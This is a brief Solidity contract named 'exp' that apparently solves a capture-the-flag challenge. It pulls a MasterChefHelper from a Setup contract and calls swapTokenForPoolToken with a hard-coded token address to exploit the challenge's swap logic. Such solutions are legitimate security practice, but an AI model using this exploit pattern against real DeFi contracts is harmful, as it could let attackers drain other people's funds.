pragma solidity 0.8.15;

import "./Setup.sol" ;



contract exp{

    MasterChefHelper target;
    address pool;
    uint256 poolid=1;


    constructor(address setup){
        target=Setup(setup).mcHelper();
    }

    function solve()external{

        target.swapTokenForPoolToken(poolid,0x767FE9EDC9E0dF98E07454847909b5E959D7ca0E,0,0);

    }

}